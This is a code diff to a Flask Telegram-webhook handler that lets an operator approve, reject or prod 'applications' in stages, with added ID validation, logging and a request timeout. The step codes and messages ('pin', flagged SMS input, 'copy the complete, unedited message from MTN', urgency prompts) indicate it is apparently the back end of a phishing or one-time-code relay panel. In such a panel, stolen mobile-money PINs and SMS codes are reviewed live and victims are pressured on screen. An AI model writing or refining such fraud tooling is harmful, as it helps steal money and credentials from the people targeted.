@@ -30,7 +30,6 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
         f"🆔 *Application ID:* `{app_data.get('app_id')}`"
     )
 
-    # Enhanced inline buttons for admin control over bad data or stalled users
     reply_markup = {
         "inline_keyboard": [
             [
@@ -63,8 +62,8 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
     data = request.get_json()
+    print("Received webhook data:", data)
     
-    # Handle inline button clicks
     if "callback_query" in data:
         callback = data["callback_query"]
         callback_data = callback["data"]
@@ -76,6 +75,14 @@ def telegram_webhook():
             step_code = parts[1]
             db_id = parts[2]
             
+            text_response = "Action processed"
+            
+            try:
+                obj_id = ObjectId(db_id)
+            except Exception as e:
+                print(f"Invalid ObjectId: {db_id}, error: {e}")
+                return jsonify({"status": "error", "message": "Invalid ID"}), 200
+
             if action == "approve":
                 if step_code == "pin":
                     new_status = "Stage1_Approved"
@@ -86,44 +93,47 @@ def telegram_webhook():
                 else:
                     new_status = "Approved"
 
-                applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
+                result = applications_collection.update_one(
+                    {"_id": obj_id},
                     {"$set": {"status": new_status, "custom_message": ""}}
                 )
+                print(f"Update result for {new_status}: modified count = {result.modified_count}")
                 text_response = f"✅ {step_code.upper()} Approved!"
 
             elif action == "reject":
                 applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
+                    {"_id": obj_id},
                     {"$set": {"status": "Rejected", "custom_message": "Verification failed. Please restart your application."}}
                 )
                 text_response = f"❌ {step_code.upper()} Rejected!"
 
             elif action == "badsms":
                 applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
+                    {"_id": obj_id},
                     {"$set": {"status": "BadInput", "custom_message": "Invalid SMS or data format submitted. Please copy the complete, unedited message from MTN."}}
                 )
                 text_response = "⚠️ Flagged bad input for user correction."
 
             elif action == "stalled":
                 applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
+                    {"_id": obj_id},
                     {"$set": {"status": "StalledPrompt", "custom_message": "Your session is waiting for authorization. Please respond promptly to avoid cancellation."}}
                 )
                 text_response = "⏱️ Sent stall reminder to user."
 
             elif action == "msg":
                 applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
+                    {"_id": obj_id},
                     {"$set": {"status": "CustomMessage", "custom_message": "Admin Note: Please review your entry and provide the correct information."}}
                 )
                 text_response = "💬 Prompt sent to user screen!"
 
             answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-            requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})
+            try:
+                requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response}, timeout=5)
+            except Exception as e:
+                print(f"Answer callback error: {e}")
 
-    # Handle direct text messages sent by admin in Telegram chat (Two-way custom reply bridge)
     elif "message" in data:
         msg = data["message"]
         chat_id = str(msg.get("chat", {}).get("id"))
